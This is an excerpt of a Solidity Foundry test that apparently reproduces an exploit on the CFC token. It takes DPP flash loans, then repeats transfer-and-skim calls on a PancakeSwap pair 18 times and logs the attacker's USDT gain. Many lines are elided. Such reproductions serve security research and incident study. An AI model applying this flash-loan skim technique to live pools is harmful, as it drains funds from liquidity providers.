...
contract CFCTest is Test {
    ...
    function testSkim() public {
        ...
        emit log_named_decimal_uint(
            "Attacker BEP20USDT balance before attack",
            BEP20USDT.balanceOf(address(this)),
            BEP20USDT.decimals()
        );
        ...
        emit log_named_decimal_uint(
            "Attacker BEP20USDT balance after attack",
            BEP20USDT.balanceOf(address(this)),
            BEP20USDT.decimals()
        );
    }
    ...
    function DPPFlashLoanCall(
        ...
        if (msg.sender == address(DPPOracle1)) {
            ...
            for (uint256 i; i < 18; ++i) {
                CFC.transfer(
                    address(CakeLP),
                    CFC.balanceOf(address(CakeLP)) - 1
                );
                CakeLP.skim(address(this));
            }
            ...
            uint256 transferAmountSAFE = Router.quote(
                CFC.balanceOf(address(this)),
                reserveCFC,
                reserveSAFE
            );
    ...
    function takeFlashloan(IDPPOracle Oracle) internal {
        Oracle.flashLoan(
            0,
            BEP20USDT.balanceOf(address(Oracle)),
            address(this),
            new bytes(1)
        );
    }
